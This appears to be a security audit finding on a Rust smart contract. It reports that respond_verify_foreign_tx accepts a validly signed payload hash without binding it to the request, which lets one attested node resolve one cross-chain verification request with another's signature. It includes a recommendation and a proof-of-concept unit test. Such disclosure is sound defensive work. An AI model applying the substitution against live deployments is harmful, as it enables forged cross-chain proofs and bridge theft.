### Title
Missing Request-to-Payload Binding in `respond_verify_foreign_tx` — (`crates/contract/src/lib.rs`)

### Summary

`respond_verify_foreign_tx` verifies only that `response.signature` is a valid ECDSA signature over `response.payload_hash` under the domain root key. It does **not** verify that `response.payload_hash` was derived from the `ForeignTxSignPayload` of the supplied `request`. A single Byzantine attested participant who holds a legitimately-produced threshold signature for R2 can submit it as the response for R1, resolving R1's yield with R2's payload hash.

### Finding Description

The full validation path in `respond_verify_foreign_tx` is:

1. Caller must be an attested participant — `assert_caller_is_attested_participant_and_protocol_active()` [1](#0-0) 
2. Fetch the domain's root public key. [2](#0-1) 
3. Verify `response.signature` over `response.payload_hash` under that key. [3](#0-2) 
4. Call `resolve_yields_for` keyed on `request`, delivering the full `response` bytes to every yield queued under R1. [4](#0-3) 

There is no step that checks `response.payload_hash == SHA-256(borsh(ForeignTxSignPayload::V1 { request: request.request, values: ... }))`. The contract cannot know `values` at respond-time, but it **can** verify that the hash was derived from a payload whose embedded `ForeignChainRpcRequest` matches `request.request`. It does not do so.

`ForeignTxSignPayloadV1` binds the tx_id inside its hash:

```rust
pub struct ForeignTxSignPayloadV1 {
    pub request: ForeignChainRpcRequest,   // contains tx_id
    pub values: Vec<ExtractedValue>,
}
// msg_hash = SHA-256(borsh(ForeignTxSignPayload))
``` [5](#0-4) 

The SDK-side verifier (`ForeignChainSignatureVerifier::verify_signature`) does enforce this binding for callers who use it:

```rust
let payload_is_correct = expected_payload_hash == response.payload_hash;
if !payload_is_correct {
    return Err(VerifyForeignChainError::IncorrectPayloadSigned { ... });
}
``` [6](#0-5) 

But the on-chain contract enforces nothing of the sort. The contract's invariant — "the response delivered to R1's callers corresponds to R1's foreign-chain observation" — is entirely unenforced.

### Impact Explanation

A single Byzantine attested participant who is the signing leader for R2 holds the complete threshold signature over `H(R2)`. They call:

```
respond_verify_foreign_tx(request = R1, response = { payload_hash: H(R2), signature: sig_over_H(R2) })
```

The contract accepts (signature is valid over `H(R2)` under the root key), removes R1 from `pending_verify_foreign_tx_requests`, and resumes every yield queued under R1 with the serialized response containing `H(R2)`. R1's callers receive a `VerifyForeignTransactionResponse` whose `payload_hash` corresponds to R2's foreign-chain observation (different tx_id, different extracted values), not R1's. Any bridge contract that does not independently re-derive and compare the expected payload hash will accept this as proof that R1's transaction was confirmed, enabling forged cross-chain verification and potential invalid bridge execution.

### Likelihood Explanation

- The attacker must be an attested participant (TEE-attested MPC node) — a meaningful but not insurmountable barrier; a single Byzantine node in the participant set suffices.
- The attacker must be the signing leader for R2's session (or otherwise hold the assembled threshold signature for R2).
- Two concurrent pending requests with the same `domain_id` but different `ForeignChainRpcRequest` values are a normal production condition (any two bridge users submitting different transactions simultaneously).
- No threshold collusion is required; one Byzantine leader is sufficient.

### Recommendation

Inside `respond_verify_foreign_tx`, after extracting `response.payload_hash`, verify that the hash is consistent with the supplied `request`. Because `values` are unknown on-chain, the minimum enforceable check is to require the response to include the `ForeignChainRpcRequest` in a verifiable way — for example, by having the node also submit the `ForeignChainRpcRequest` embedded in the payload and verifying `SHA-256(borsh(ForeignTxSignPayload::V1 { request: request.request, values })) == response.payload_hash` where `values` are also submitted and hashed. Alternatively, include `request.request` directly in the signed payload hash at the contract level so the contract can verify the prefix without knowing `values`.

### Proof of Concept

Adapting the existing unit-test harness in `crates/contract/src/lib.rs`:

```rust
#[test]
fn respond_verify_foreign_tx__cross_request_payload_substitution() {
    let mut rng = rand::rngs::StdRng::from_seed([42u8; 32]);
    let (context, mut contract, secret_key) =
        basic_setup_with_protocol(Protocol::CaitSith, DomainPurpose::ForeignTx, &mut rng);
    register_supported_chains(&mut contract, [dtos::ForeignChain::Bitcoin]);
    testing_env!(context.clone());
    let SharedSecretKey::Secp256k1(secret_key) = secret_key else { unreachable!() };

    // Queue R1 (tx_id = [0x01; 32])
    let r1_args = VerifyForeignTransactionRequestArgs {
        domain_id: DomainId::default().0.into(),
        payload_version: ForeignTxPayloadVersion::V1,
        request: dtos::ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
            tx_id: [0x01u8; 32].into(),
            confirmations: 1.into(),
            extractors: vec![BitcoinExtractor::BlockHash],
        }),
    };
    let r1 = args_into_verify_foreign_tx_request(r1_args.clone());
    contract.verify_foreign_transaction(r1_args);

    // Queue R2 (tx_id = [0x02; 32])
    let r2_args = VerifyForeignTransactionRequestArgs {
        domain_id: DomainId::default().0.into(),
        payload_version: ForeignTxPayloadVersion::V1,
        request: dtos::ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
            tx_id: [0x02u8; 32].into(),
            confirmations: 1.into(),
            extractors: vec![BitcoinExtractor::BlockHash],
        }),
    };
    let r2 = args_into_verify_foreign_tx_request(r2_args.clone());
    contract.verify_foreign_transaction(r2_args);

    // Build a valid signature over R2's payload_hash
    let r2_payload = ForeignTxSignPayload::V1(ForeignTxSignPayloadV1 {
        request: r2.request.clone(),
        values: vec![ExtractedValue::BitcoinExtractedValue(
            BitcoinExtractedValue::BlockHash([0xABu8; 32].into()),
        )],
    });
    let r2_hash = r2_payload.compute_msg_hash().unwrap();
    let sk_ec = elliptic_curve::SecretKey::<Secp256k1>::from_bytes(&secret_key.to_bytes()).unwrap();
    let signing_key = SigningKey::from_bytes(&sk_ec.to_bytes()).unwrap();
    let (sig, rec) = signing_key.sign_prehash_recoverable(&r2_hash.0).unwrap();
    let response = VerifyForeignTransactionResponse {
        payload_hash: r2_hash.clone(),
        signature: dtos::SignatureResponse::Secp256k1(
            dtos::K256Signature::from_ecdsa_recoverable(&sig, rec),
        ),
    };

    with_active_participant_and_attested_context(&contract);

    // Submit R2's response against R1's request key — contract accepts it
    contract
        .respond_verify_foreign_tx(r1.clone(), response)
        .expect("contract accepted R2 payload for R1");

    // R1's yield is now resolved with R2's payload_hash — binding is broken
    assert!(contract.get_pending_verify_foreign_tx_request(&r1).is_none());
    // R2's queue is untouched — it was never resolved
    assert!(contract.get_pending_verify_foreign_tx_request(&r2).is_some());
}
```

The call succeeds because the contract only checks `verify_ecdsa_signature(sig, r2_hash, root_pk)` — which passes — and never checks that `r2_hash` was derived from `r1.request`. [7](#0-6) [8](#0-7)

```rust
pub(crate) fn resolve_yields_for<K>(
    requests: &mut LookupMap<K, Vec<YieldIndex>>,
    request: &K,
    response_bytes: Vec<u8>,
) -> Result<(), Error>
where
    K: BorshSerialize + BorshDeserialize + Clone + Ord,
{
    let resumed = requests
        .remove(request)
        .unwrap_or_default()
        .into_iter()
        .map(|YieldIndex { data_id }| {
            env::promise_yield_resume(&data_id, response_bytes.clone());
        })
        .count();

    if resumed > 0 {
        Ok(())
    } else {
        Err(InvalidParameters::RequestNotFound.into())
    }
}
